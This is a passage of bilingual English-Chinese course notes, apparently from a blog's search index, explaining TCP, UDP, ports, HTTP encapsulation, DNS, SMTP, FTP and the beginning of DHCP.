TCP</li>\n</ol>\n<ul>\n<li>Connection-oriented\n<ol>\n<li>TCP’s handshaking processes</li>\n</ol>\n<ul>\n<li>Before data transmission: It establishes a <strong>three-way handshake</strong> process with the destination, then data is transferred</li>\n<li>After data transmission:  The connection is terminated by a <strong>four-way handshake</strong> process</li>\n</ul>\n<ol start=\"2\">\n<li>TCP offers full-duplex service</li>\n</ol>\n<ul>\n<li>Data can be carried in both directions at the same time</li>\n</ul>\n<ol start=\"3\">\n<li>TCP segment format</li>\n</ol>\n<ul>\n<li>Encapsulated by IP packet in Network layer  becomes IP packet’s “data”</li>\n</ul>\n</li>\n<li>Sequencing and checksums—TCP sends a character string called a checksum that is checked by the destination host along with a sequence number for each segment</li>\n<li>Flow control—Gauges rate of transmission based on how quickly recipient can accept data</li>\n<li>重传机制 Retry mechanism\n<ol>\n<li>确认机制：TCP 在数据传输过程中会使用 确认（ACK） 来通知发送方哪些数据包已成功到达接收方。每当接收方收到一个数据段时，它会向发送方发送一个确认消息，表示该数据段已成功接收。</li>\n<li>重传丢失的段：如果某个数据段在传输过程中丢失或损坏，接收方不会发送确认消息。TCP 会使用重传超时（retransmission timeout RTO）机制 来确保丢失的段得到重传。</li>\n<li>重传超时（RTO）机制：当 TCP 发送一个数据段时，会启动一个定时器。如果在设定的超时时间内没有收到该段的确认（ACK），则认为该数据段可能丢失，TCP 将会重传该数据段。定时器在接收到确认消息后停止，以防止不必要的重传。</li>\n</ol>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Fields of a TCP Segment<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/9f400dd05957f1a3.png\" alt=\"img\"><br>\nAn Example<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/fa75fbe787ff410b.png\" alt=\"img\"></li>\n</ol>\n<ul>\n<li>16-bit SOURCE field\n<ul>\n<li>Identifies the sending port</li>\n</ul>\n</li>\n<li>16-bit DESTINATION PORT field\n<ul>\n<li>Identifies the receiving port</li>\n</ul>\n</li>\n<li>32-bit SEQUENCE NUMBER field\n<ul>\n<li>Defines the  1st byte number of this datagram</li>\n<li>The numbering does not necessarily start from 0</li>\n</ul>\n</li>\n<li>32-bit ACKNOWLEDGEMENT NUMBER field\n<ul>\n<li>Indicates explicitly that a specific set of data received successfully</li>\n<li>Indicates the next byte expected sequence number from the other side of the communication</li>\n</ul>\n</li>\n<li>16-bit WINDOW field\n<ul>\n<li>Indicates the size of the TCP receiver buffer in bytes</li>\n</ul>\n</li>\n<li>CHECKSUM 16-bit checksum field:\n<ul>\n<li>For the integrity of the header and data</li>\n</ul>\n</li>\n<li>URGENT POINTER 16-bit field\n<ul>\n<li>It is used with the URGENT flag to point to the end of urgent data sent in a segment</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>标志位</th>\n<th>说明</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>URG (U)</strong></td>\n<td>紧急指针</td>\n<td>通知接收方报文中某些数据是紧急的，需要优先处理，接收方会评估紧急指针</td>\n</tr>\n<tr>\n<td><strong>ACK (A)</strong></td>\n<td>确认</td>\n<td>表示发送该报文的设备请求确认接收，用于确认数据的接收</td>\n</tr>\n<tr>\n<td><strong>PSH §</strong></td>\n<td>推送</td>\n<td>请求立即发送数据，将缓冲区中的数据推送到接收端</td>\n</tr>\n<tr>\n<td><strong>RST ®</strong></td>\n<td>复位</td>\n<td>重置连接，用于立即终止连接</td>\n</tr>\n<tr>\n<td><strong>SYN (S)</strong></td>\n<td>同步</td>\n<td>用于初始化连接，表明正在建立新的连接</td>\n</tr>\n<tr>\n<td><strong>FIN (F)</strong></td>\n<td>结束</td>\n<td>表示发送方已经没有更多的数据要发送，表示连接的结束</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"TCP Connection and Disconnection\" class=\"active\"><a class=\"anchor\"  href=\"#TCP Connection and Disconnection\">#</a>TCP Connection and Disconnection</h2>\nThree stages of a TCP connection:\n<ol>\n<li>Connection establishment with a 3-way handshake</li>\n</ol>\n<ul>\n<li>Three transmissions sent before data transmission:\n<ul>\n<li>Step 1 — (A → B) Request for a connection (SYN)</li>\n<li>Step 2 — (B → A) Response to the request (SYN/ACK)</li>\n<li>Step 3 — (A → B) Connection established (ACK)</li>\n</ul>\n</li>\n<li>After the three initial messages, the payload or data is sent</li>\n<li>Sequence numbers will be increased by the number of bits included in each received segment<br>\nThis confirms that the correct length of message was received<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/5e6910628ec58039.png\" alt=\"img\"></li>\n</ul>\n<ol start=\"2\">\n<li>\n<p>Data transfer<br>\nReceipt of data must be acknowledged with an ACK that specifies the byte number that the receiver is expecting to receive from the sender<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/5bcef8a1b7ac03dc.png\" alt=\"img\"></p>\n</li>\n<li>\n<p>Connection termination with a 4-way handshake</p>\n</li>\n</ol>\n<ul>\n<li>Four segments may need to be exchanged to terminate a TCP connection\n<ol>\n<li>Since a TCP connection is full-duplex, data may flow independently in each direction</li>\n<li>Each direction must be shut down independently</li>\n<li>Each half-close will require a FIN and ACK segments to be sent.<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/793afec4c1014846.png\" alt=\"img\"></li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>summary</li>\n</ol>\n<ul>\n<li>TCP provides a connection mechanism for the application program\n<ul>\n<li>The client makes a connection with the server, i.e.,\n<ul>\n<li>a virtual circuit connection is established before data is transferred</li>\n</ul>\n</li>\n<li>The client and server exchange data in both directions\n<ul>\n<li>Data is then streamed through this connection</li>\n</ul>\n</li>\n<li>Terminate the connection when the data transmission is done</li>\n</ul>\n</li>\n<li>TCP offers full-duplex service\n<ul>\n<li>Each TCP has a sending and receiving buffer and segments are sent in both direction</li>\n</ul>\n</li>\n<li>TCP provides reliable transmission via\n<ul>\n<li>Error control (checksum), flow control (sliding window protocol), and ACK/Retry mechanism (Ack to sender for received packets, timeout, retransmission)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Process-to-Process Communications</li>\n</ol>\n<ul>\n<li>IP is for host-to-host communications</li>\n<li>TCP is for delivery of the message to the appropriate application program, i.e.,<br>\nprocess-to-process communications</li>\n<li>A computer may be running several programs at the same time\n<ul>\n<li>To make every connection unique, we need to use IP address and port number to establish a  unique identifier on a machine</li>\n<li>This is achieved through <strong>socket</strong></li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Socket Addresses – Unique Connections</li>\n</ol>\n<ul>\n<li>Every connection has 2 sockets or endpoints:\n<ul>\n<li>Source IP: Source port, \te.g., 131.181.143.129:2525</li>\n<li>Destination IP: Destination port, \te.g., 131.181.118.220: 80</li>\n</ul>\n</li>\n<li>The connection creates a unique virtual channel.<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/300ed231c5e2e1de.png\" alt=\"socket\"></li>\n</ul>\n<ol start=\"7\">\n<li>Sockets and Ports</li>\n</ol>\n<ul>\n<li>Port number range: 0 to 65535</li>\n<li>Three types\n<ol>\n<li>Well Known Ports</li>\n</ol>\n<ul>\n<li>Range: 0 to 1023</li>\n<li>Operating system or administrator use</li>\n</ul>\n<ol start=\"2\">\n<li>Registered Ports</li>\n</ol>\n<ul>\n<li>Range: 1024 to 49151</li>\n<li>Network users, processes with no special privileges</li>\n</ul>\n<ol start=\"3\">\n<li>Dynamic and/or Private Ports</li>\n</ol>\n<ul>\n<li>Range: 49152 to 65535</li>\n<li>Normally for a client use</li>\n<li>No restrictions</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Port number</th>\n<th>Process name</th>\n<th>Protocol used</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>20</td>\n<td>FTP-DATA</td>\n<td>TCP</td>\n<td>File transfer—data</td>\n</tr>\n<tr>\n<td>21</td>\n<td>FTP</td>\n<td>TCP</td>\n<td>File transfer—control</td>\n</tr>\n<tr>\n<td>22</td>\n<td>SSH</td>\n<td>TCP</td>\n<td>Secure Shell</td>\n</tr>\n<tr>\n<td>23</td>\n<td>TELNET</td>\n<td>TCP</td>\n<td>Telnet</td>\n</tr>\n<tr>\n<td>25</td>\n<td>SMTP</td>\n<td>TCP</td>\n<td>Simple Mail Transfer Protocol</td>\n</tr>\n<tr>\n<td>53</td>\n<td>DNS</td>\n<td>TCP and UDP</td>\n<td>Domain Name System</td>\n</tr>\n<tr>\n<td>67 (client to server) and 68 (server to client)</td>\n<td>DHCPv4</td>\n<td>UDP</td>\n<td>Dynamic Host Configuration Protocol version 4</td>\n</tr>\n<tr>\n<td>69</td>\n<td>TFTP</td>\n<td>UDP</td>\n<td>Trivial File Transfer Protocol</td>\n</tr>\n<tr>\n<td>80</td>\n<td>HTTP</td>\n<td>TCP and UDP</td>\n<td>Hypertext Transfer Protocol</td>\n</tr>\n<tr>\n<td>110</td>\n<td>POP3</td>\n<td>TCP</td>\n<td>Post Office Protocol 3</td>\n</tr>\n<tr>\n<td>123</td>\n<td>NTP</td>\n<td>TCP</td>\n<td>Network Time Protocol</td>\n</tr>\n<tr>\n<td>143</td>\n<td>IMAP</td>\n<td>TCP</td>\n<td>Internet Message Access Protocol</td>\n</tr>\n<tr>\n<td>443</td>\n<td>HTTPS</td>\n<td>TCP</td>\n<td>Secure implementation of HTTP</td>\n</tr>\n<tr>\n<td>546 (client to server) and 547 (server to client)</td>\n<td>DHCPv6</td>\n<td>UDP</td>\n<td>Dynamic Host Configuration Protocol version 6</td>\n</tr>\n<tr>\n<td>3389</td>\n<td>RDP</td>\n<td>TCP</td>\n<td>Remote Desktop Protocol</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"UDP (User Datagram Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#UDP (User Datagram Protocol)\">#</a>UDP (User Datagram Protocol)</h1>\n<ol>\n<li>UDP and its Features</li>\n</ol>\n<ul>\n<li>UDP is a Transport layer protocol</li>\n<li>It provides unreliable data delivery services\n<ul>\n<li>Connectionless transport service\n<ul>\n<li>No guarantee packets received at all</li>\n</ul>\n</li>\n<li>No error checking, no sequencing, no flow control\n<ul>\n<li>No assurance packets received correctly and in correct sequence</li>\n<li>Lower overhead than TCP</li>\n</ul>\n</li>\n<li>Lacks sophistication = simple\n<ul>\n<li>More efficient than TCP</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Useful situations\n<ul>\n<li>Great volume of data transferred quickly, e.g., video streaming</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Format of UDP Messages</li>\n</ol>\n<ul>\n<li>Each UDP message is called a <strong>user datagram</strong></li>\n<li>Has a fixed size header of 8 bytes</li>\n<li>16 bit SOURCE / DESTINATION PORT fields\n<ul>\n<li>Port number (between 0 and 65535)\n<ul>\n<li>Well-known ports 0 ~1023</li>\n<li>Client host’s operating system may randomly choose a port  to communicate with a server</li>\n</ul>\n</li>\n<li>Checksum is optional for IPv4, but mandatory for IPv6<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/eaa62641752a90e7.png\" alt=\"UDPheader\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Use</li>\n</ol>\n<ul>\n<li>UDP is used while error checking and correction are performed by the application, such as\n<ul>\n<li>Domain Name System (DNS)</li>\n<li>Dynamic Host Configuration Protocol (DHCP)</li>\n<li>Trivial File Transfer Protocol (TFTP)</li>\n<li>IPTV</li>\n<li>Voice over IP (VoIP)</li>\n<li>Real Time Streaming Protocol</li>\n<li>Routing Information Protocol (RIP)</li>\n<li>Simple Network Management Protocol (SNMP)</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","TCP","UDP"]},{"title":"Layer 7 - Application-layer Protocols and Services","url":"/course/Layer-7-Application-layer-Protocols-and-Services/","content":"<h1 id=\"Hypertext Transfer Protocol (HTTP)\" class=\"active\"><a class=\"anchor\"  href=\"#Hypertext Transfer Protocol (HTTP)\">#</a>Hypertext Transfer Protocol (HTTP)</h1>\n<ol>\n<li>World Wide Web (WWW)</li>\n</ol>\n<ul>\n<li>The most popular service on the Internet</li>\n<li>Immense collection of Web pages and other resources that can be downloaded across the Internet and displayed on a workstation via a web browser</li>\n<li>The main concept is  <code>hypertext</code></li>\n<li>A system that allows related documents to be linked together\n<ul>\n<li>A “web” of electronically-linked documents</li>\n</ul>\n</li>\n<li>Major functional components of the WWW\n<ul>\n<li>HyperText Markup Language (HTML)</li>\n<li>Hypertext Transfer Protocol (HTTP)</li>\n<li>Uniform Resource Identifiers (URIs)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>HTTP<br>\nOriginally, its main purpose was to transfer static web pages written in HTML</li>\n</ol>\n<ul>\n<li>Now, it is also used for general file transfer and downloading/displaying multimedia files</li>\n<li>Default TCP port number is 80</li>\n<li>HTTP is an application-layer protocol\n<ul>\n<li>HTTP/2 is based on TCP as its Transport-layer protocol</li>\n<li>HTTP/3 is based on QUIC as its Transport-layer protocol (RFC 9114, released on 6 June 2022)\n<ul>\n<li>QUIC (RFC 9000, released in May 2021)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Functions as a request-response protocol in the client-server computing model</li>\n<li>Identify and locate network resources by Uniform Resource Identifiers (URIs)</li>\n</ul>\n<ol start=\"3\">\n<li>HTTP Encapsulation</li>\n</ol>\n<ul>\n<li>Example of how the layers work together:\n<ol>\n<li>\n<p>start your Web browser and your home page is <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==\">http://www.example.com</span></p>\n</li>\n<li>\n<p>The web browser formats a request for your home page by using the Application layer protocol HTTP</p>\n</li>\n<li>\n<p>The request looks something like:  <code>get the example.com home page</code></p>\n</li>\n<li>\n<p>The unit of information the Application layer works with is simply called  <code>data</code> <br>\nThe Application-layer protocol HTTP passes the request down to the Transport-layer protocol (TCP)</p>\n</li>\n<li>\n<p>TCP adds a header to the request</p>\n</li>\n<li>\n<p>The unit of information the Transport layer works with is called a  <code>segment</code></p>\n</li>\n<li>\n<p>TCP passes the segment to the Internetwork layer protocol (IP)</p>\n</li>\n<li>\n<p>IP places its header on the segment</p>\n</li>\n<li>\n<p>The unit of information is now called a  <code>packet</code></p>\n</li>\n<li>\n<p>The packet is passed down to the Network access layer, where the NIC operates</p>\n</li>\n<li>\n<p>A  <code>frame</code>  header and trailer are added<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/6b810b6747c82aec.png\" alt=\"img\"></p>\n</li>\n<li>\n<p>The frame is delivered to the network medium as bits</p>\n</li>\n</ol>\n<ul>\n<li>on its way to the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==\">www.example.com</span> server</li>\n</ul>\n<ol start=\"13\">\n<li>The web server processes it and returns a Web page</li>\n</ol>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Uniform Resource Identifiers (URIs)</li>\n</ol>\n<ul>\n<li>A method of defining labels that the users of the Web could locate hypertext documents so they could be located and referenced</li>\n<li>Not specific to the Web, though they are most often associated with the Web and HTTP</li>\n<li>Uniform Resource Locators (URLs) are a subset of URIs</li>\n</ul>\n<ol start=\"5\">\n<li>Locating a Document on the Internet</li>\n</ol>\n<ul>\n<li>Every document on the Internet has a unique Uniform Resource Locator (URL)</li>\n<li>All URLs consist of four parts:\n<ul>\n<li>Service type, e.g., http://</li>\n<li>Host or domain name, e.g., <a href=\"http://example.com\">example.com</a></li>\n<li>Directory or subdirectory information</li>\n<li>Filename</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Web Client/Server</li>\n</ol>\n<ul>\n<li>Web client\n<ul>\n<li>To communicate with a web server, using Hypertext Transfer Protocol (HTTP)\n<ul>\n<li>Firefox, Edge, Chrome</li>\n</ul>\n</li>\n<li>To submit an HTTP request to the server</li>\n</ul>\n</li>\n<li>Web server\n<ul>\n<li>To provide web content that can be accessed through the Internet\n<ul>\n<li>Microsoft’s Internet Information Services (IIS)</li>\n<li>Apache</li>\n</ul>\n</li>\n<li>To provide response message to the client</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Domain Name System (DNS)\" class=\"active\"><a class=\"anchor\"  href=\"#Domain Name System (DNS)\">#</a>Domain Name System (DNS)</h1>\n<h2 id=\"DNS\" class=\"active\"><a class=\"anchor\"  href=\"#DNS\">#</a>DNS</h2>\n<ol>\n<li>Domain Names</li>\n</ol>\n<ul>\n<li>Domain\n<ul>\n<li>Group of computers belonging to same organization</li>\n<li>Share common part of IP address</li>\n</ul>\n</li>\n<li>Domain name\n<ul>\n<li>Identifies domain (<span class=\"exturl\" data-url=\"aHR0cDovL2xvYy5nb3Y=\">loc.gov</span>)</li>\n<li>Associated with company, university, government organization</li>\n</ul>\n</li>\n<li>Fully qualified host name (<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2dzLmxvYy5nb3Y=\">blogs.loc.gov</span>)\n<ul>\n<li>Local host name plus domain name</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Domain Name System (DNS)</li>\n</ol>\n<ul>\n<li>Commonly used analogy a “phone book” for the Internet</li>\n<li>To keep the system manageable, the DNS is a hierarchical distributed naming service for computers/services/resources connected to the Internet</li>\n<li>Translate human-friendly computer hostnames into IP addresses to locate computer resources\n<ul>\n<li>Computers do not use domain names, but binary addressing</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"DNS Database Structure\" class=\"active\"><a class=\"anchor\"  href=\"#DNS Database Structure\">#</a>DNS Database Structure</h2>\n<ol>\n<li>DNS Database Structure</li>\n</ol>\n<ul>\n<li>Can be best understood as a tree structure\n<ul>\n<li>In the domain namespace, all domains meet at the root, identified by a single period (.)</li>\n</ul>\n</li>\n<li>Second-level domain (SLD) are usually the name of a company or institution</li>\n<li>Subdomain is optional</li>\n<li>Host level represents individual device</li>\n<li>Some Well-known Top-level Domains</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Domain suffix</th>\n<th>Type of organization</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ARPA</td>\n<td>Reverse lookup domain (special Internet function)</td>\n</tr>\n<tr>\n<td>COM</td>\n<td>Commercial</td>\n</tr>\n<tr>\n<td>EDU</td>\n<td>Educational</td>\n</tr>\n<tr>\n<td>GOV</td>\n<td>Government</td>\n</tr>\n<tr>\n<td>ORG</td>\n<td>Noncommercial organization (such as a nonprofit agency)</td>\n</tr>\n<tr>\n<td>NET</td>\n<td>Network (such as an ISP)</td>\n</tr>\n<tr>\n<td>INT</td>\n<td>International Treaty Organization</td>\n</tr>\n<tr>\n<td>MIL</td>\n<td>United States military organization</td>\n</tr>\n<tr>\n<td>BIZ</td>\n<td>Businesses</td>\n</tr>\n<tr>\n<td>INFO</td>\n<td>Unrestricted use</td>\n</tr>\n<tr>\n<td>AERO</td>\n<td>Air-transport industry</td>\n</tr>\n<tr>\n<td>COOP</td>\n<td>Cooperatives</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"2\">\n<li>Root Servers</li>\n</ol>\n<ul>\n<li>Root servers are the authoritative name servers that serve the DNS root zone</li>\n<li>Root servers are a network of hundreds of servers for redundancy in many countries around the world.</li>\n<li>They are specified in the DNS root zone as 13 logical named authorities.\n<ul>\n<li>This does not mean that there are only 13 physical servers; each operator uses redundant computer equipment to provide reliable<br>\nservice</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>DNS Client (Resolver)</li>\n</ol>\n<ul>\n<li>DNS clients in most operating systems maintain a DNS cache, called a resolver cache\n<ul>\n<li>Stores name and IP address pairs and other data</li>\n</ul>\n</li>\n<li>The DNS client is responsible for communicating with a DNS server to resolve computer and domain names to IP addresses</li>\n<li>An OS must be configured to use DNS and needs at least one address of a DNS server that it can query</li>\n<li>In Windows, the first DNS server configured is called the preferred DNS server and the second one is the alternate DNS server</li>\n</ul>\n<ol start=\"4\">\n<li>DNS server<br>\nDNS servers are composed of the following:</li>\n</ol>\n<ul>\n<li>DNS zones – a database of primarily hostname and IP address pairs</li>\n<li>Resource records – the data contained in a zone</li>\n<li>Cache – results of queries are cached so that if the same query occurs again, the local DNS server can respond without having to contact another server</li>\n<li>Root hints – file containing a list of all IP addresses of Internet root servers</li>\n<li>DNS Server service – runs in the background and listens for DNS queries on UDP port 53</li>\n<li>DNS Query Making its Way Through the DNS Hierarchy<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/95ccdad58249c863.png\" alt=\"img\"></li>\n</ul>\n<h2 id=\"DNS Database Records\" class=\"active\"><a class=\"anchor\"  href=\"#DNS Database Records\">#</a>DNS Database Records</h2>\n<ol>\n<li>Resource records (RR)</li>\n</ol>\n<ul>\n<li>Stores data associated with domain names, address records, and other specific data</li>\n<li>Divided into four classes, of which Internet class is of most interest to the users</li>\n</ul>\n<ol start=\"2\">\n<li>Most Commonly Used Record Types\n<ol>\n<li>Start of Authority (SOA) record</li>\n</ol>\n<ul>\n<li>Identifies the name server that is authoritative for a specific DNS database segment;</li>\n<li>Identifies the master DNS server for a specific domain or sub-domain</li>\n<li>First entry in the DNS file - both  <code>domain.dns</code>  and  <code>addr.in-addr.arpa.dns</code>  files - must be an SOA record</li>\n<li>Identifies the current name server as the best source of information for data in its zone</li>\n<li>Both secondary and primary name servers can\n<ul>\n<li>Designate themselves as authoritative in their own SOA records</li>\n<li>This allows load-balancing across a primary and one or more secondary DNS servers in a domain</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Name Server (NS) record</li>\n</ol>\n<ul>\n<li>Used to identify all DNS servers in a domain</li>\n</ul>\n<ol start=\"3\">\n<li>Address (A) record</li>\n</ol>\n<ul>\n<li>Stores domain name-to-IP address translation data</li>\n</ul>\n<ol start=\"4\">\n<li>Canonical name (CNAME) record</li>\n</ol>\n<ul>\n<li>Used to create aliases</li>\n</ul>\n<ol start=\"5\">\n<li>Mail Exchange (MX) record</li>\n</ol>\n<ul>\n<li>Used to route SMTP-based e-mail on the Internet and identify the IP address for a domain’s master e-mail server</li>\n</ul>\n<ol start=\"6\">\n<li>Pointer (PTR) record</li>\n</ol>\n<ul>\n<li>Stores IP address-to-domain name translation data and supports the operation known as a reverse DNS lookup</li>\n</ul>\n</li>\n<li>Mapping Addresses to Names</li>\n</ol>\n<ul>\n<li>Records in the  <code>db.addr</code>  file are provided to support reverse DNS lookups</li>\n<li>Reverse address lookups are used primarily to determine if IP address that a user presents matches the domain name from which the user claims to originate</li>\n</ul>\n<ol start=\"4\">\n<li>Resolving process\n<ol>\n<li>The DNS query is sent by the resolver to the local DNS server for resolution</li>\n<li>If local DNS server does not recognise the address, then it queries the root server</li>\n<li>If root server doesn’t recognize the domain name, the root will provide relevant information to the the resolver to contact the name server, which is the next level down</li>\n<li>Repetition of the step to process each domain name in a top-down manner until the query is resolved, then\n<ul>\n<li>The resolver returns the resolved IP address to the requester</li>\n</ul>\n</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"Remote Login (Telnet) and Secure Shell (SSH)\" class=\"active\"><a class=\"anchor\"  href=\"#Remote Login (Telnet) and Secure Shell (SSH)\">#</a>Remote Login (Telnet) and Secure Shell (SSH)</h1>\n<ol>\n<li>Remote Login (Telnet and SSH)</li>\n</ol>\n<ul>\n<li>A terminal emulation program for TCP/IP networks\n<ul>\n<li>Allows a user to remotely log in to a distant computer site</li>\n<li>User usually needs a login ID and password to access a remote computer site</li>\n<li>To provide access to a command-line interface on a remote host</li>\n</ul>\n</li>\n<li>Telnet and SSH: network protocols for remote login\n<ul>\n<li>Telnet (Port 23) is not secure</li>\n<li>SSH (Port 22) provides an encrypted channel between the client and server</li>\n</ul>\n</li>\n<li>SSH Clients\n<ul>\n<li>PuTTY</li>\n<li>use SSH from Windows Command window and MacOS terminal window</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Remote Desktop Software</li>\n</ol>\n<ul>\n<li>Remote desktop software\n<ul>\n<li>Remote Desktop Protocol (RDP)\n<ul>\n<li>Uses Graphic User Interface (GUI) to manage/access Windows computers remotely</li>\n</ul>\n</li>\n<li>Independent Computing Architecture (ICA)</li>\n<li>Virtual network computing (VNC)</li>\n</ul>\n</li>\n<li>Some remote desktop clients\n<ul>\n<li>Google’s Chrome Remote Desktop</li>\n<li>Microsoft Remote Desktop</li>\n<li>TeamViewer</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Simple Mail Transfer Protocol (SMTP)\" class=\"active\"><a class=\"anchor\"  href=\"#Simple Mail Transfer Protocol (SMTP)\">#</a>Simple Mail Transfer Protocol (SMTP)</h1>\n<h2 id=\"E-mail Protocol\" class=\"active\"><a class=\"anchor\"  href=\"#E-mail Protocol\">#</a>E-mail Protocol</h2>\n<ol>\n<li>E-mail Protocols</li>\n</ol>\n<ul>\n<li>Post Office Protocol version 3 (POP3) is used to download incoming messages from e-mail servers to local desktops (uses TCP port 110)</li>\n<li>Internet Message Access Protocol v.4 (IMAP4) used to manage email messages locally and yet stores email folders on a server (uses TCP port 143)</li>\n<li>Simple Mail Transfer Protocol (SMTP) is the standard protocol for sending email over the Internet (uses TCP port 25)</li>\n</ul>\n<ol start=\"2\">\n<li>邮件系统的组成\n<ol>\n<li>Mail User Agent (MUA) - 邮件用户代理</li>\n</ol>\n<ul>\n<li>功能：MUA 是电子邮件应用程序，用于创建、发送、接收、存储、回复和转发电子邮件。它还支持附件功能。</li>\n<li>示例：如 Outlook、Thunderbird 等。</li>\n<li>用途：通过 SMTP 协议发送邮件，通过 POP 或 IMAP 协议下载和接收邮件。</li>\n</ul>\n<ol start=\"2\">\n<li>Message Transfer Agent (MTA) - 消息传输代理</li>\n</ol>\n<ul>\n<li>功能：MTA 负责准备和传输电子邮件消息，确保邮件能够在不同服务器之间传输。</li>\n<li>用途：MTA 在不同的邮件服务器之间传递邮件。</li>\n</ul>\n<ol start=\"3\">\n<li>Multipurpose Internet Mail Extension (MIME) - 多用途互联网邮件扩展</li>\n</ol>\n<ul>\n<li>功能：MIME 用于将非文本格式的文件（如图像、音频、视频等）附加到电子邮件中，使得电子邮件可以包含多种格式的内容。</li>\n<li>用途：通过 MIME 标准，电子邮件不仅能传输文本，还能传输附件，如图片、PDF 等文件。</li>\n</ul>\n</li>\n<li>邮件系统的工作流程\n<ul>\n<li>发送邮件：MUA 创建邮件并通过 SMTP 协议将其发送到 MTA；MTA 将邮件传递到收件人的 SMTP 服务器。</li>\n<li>接收邮件：收件人的 MUA 通过 POP 或 IMAP 协议从 SMTP 服务器下载邮件<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/b496d50c4b936cc4.png\" alt=\"email\"></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"SMTP\" class=\"active\"><a class=\"anchor\"  href=\"#SMTP\">#</a>SMTP</h2>\n<ol>\n<li>SMTP Communications</li>\n</ol>\n<ul>\n<li>SMTP commands and reply codes immediately follow the TCP header</li>\n<li>SMTP commands occur behind the scenes in some e-mail clients and some server-to-server mail transfers on the Internet</li>\n<li>The majority of e-mail clients today use SMTP to send outgoing mail through some nearby SMTP server which assumes the task of storing or forwarding such messages, depending on addressee’s domain</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>helo</td>\n<td>Used by the client to identify itself</td>\n</tr>\n<tr>\n<td>mail from</td>\n<td>Used by the client to identify the sender</td>\n</tr>\n<tr>\n<td>rcpt to</td>\n<td>Used by the client to identify the recipient</td>\n</tr>\n<tr>\n<td>data</td>\n<td>Used to send the message</td>\n</tr>\n<tr>\n<td>quit</td>\n<td>To terminate the message</td>\n</tr>\n<tr>\n<td>vrfy</td>\n<td>Used to verify the address of recipient</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/e4681fbfda7303a9.png\" alt=\"email\"></p>\n<h1 id=\"File Transfer Protocol (FTP)\" class=\"active\"><a class=\"anchor\"  href=\"#File Transfer Protocol (FTP)\">#</a>File Transfer Protocol (FTP)</h1>\n<ol>\n<li>FTP</li>\n</ol>\n<ul>\n<li>FTP is a client/server protocol used for file transfer across the Internet\n<ul>\n<li>Uses two channels: TCP ports 20 and 21\n<ul>\n<li>Port 21 for control commands, Port 20 for transferring data</li>\n</ul>\n</li>\n<li>Not a secure protocol</li>\n</ul>\n</li>\n<li>Uses URL for an FTP site begins with  <code>ftp://...</code></li>\n<li>The 3 most common ways to access an FTP site:\n<ul>\n<li>Through a browser</li>\n<li>Using an FTP client program</li>\n<li>Issuing FTP commands at a text-based command prompt</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>FTP connections</li>\n</ol>\n<ul>\n<li>TCP-based Command Connection (control connection)\n<ul>\n<li>The command connection runs over TCP</li>\n<li>Created automatically when FTP connection is established in response to open command from FTP client, using server FTP port number 21</li>\n<li>The client uses a dynamic, or ephemeral, port number to handle the other end of a command connection</li>\n</ul>\n</li>\n<li>TCP-based Data Transfer Connection (data connection)\n<ul>\n<li>The data transfer connection also runs over TCP</li>\n<li>Created by the server by default</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Dynamic Host Configuration Protocol (DHCP)\" class=\"active\"><a class=\"anchor\"  href=\"Dynamic Host Configuration Protocol (DHCP)\">#</a>Dynamic Host Configuration Protocol (DHCP)</h1>\n<ol>\n<li>DHCP</li>\n</ol>\n<ul>\n<li>DHCP is used to automatically assign IP addresses as needed\n<ul>\n<li>When a computer is turned on, it requests an address from a server that is configured as a DHCP server</li>\n<li>The server assigns an address for a specific amount of time (called<br>\na 